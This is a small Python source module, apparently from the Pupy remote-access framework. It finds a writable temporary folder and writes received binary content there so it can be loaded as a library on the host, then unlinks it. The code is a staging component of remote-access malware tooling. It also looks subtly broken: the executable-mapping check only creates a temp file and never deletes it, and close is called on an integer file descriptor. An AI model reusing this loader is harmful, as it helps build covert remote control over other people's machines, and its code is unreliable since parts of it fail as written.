# -*- coding: utf-8 -*-

__all__ = (
    'load_content',
)


from tempfile import mkstemp
from os import unlink

import pupy

from .utils import load_library_common, find_writable_folder


def _does_dest_allows_executable_mappings(folder):
    try:
        fd, tmp_file = mkstemp(prefix='.pyd', dir=folder)
    except OSError as e:
        pupy.dprint('Folder {} is not accessible: {}', folder, e)
        return False

    return True


DROP_DIR = find_writable_folder(
    ['/tmp', '/var/tmp'],
    validate=_does_dest_allows_executable_mappings
)


def load_content(content, name, dlopen=False, initfuncname=None):
    fd, filepath = mkstemp(dir=DROP_DIR)
    try:
        return load_library_common(
            fd, filepath, content, name, dlopen, initfuncname
        )
    finally:
        unlink(filepath)
        fd.close()
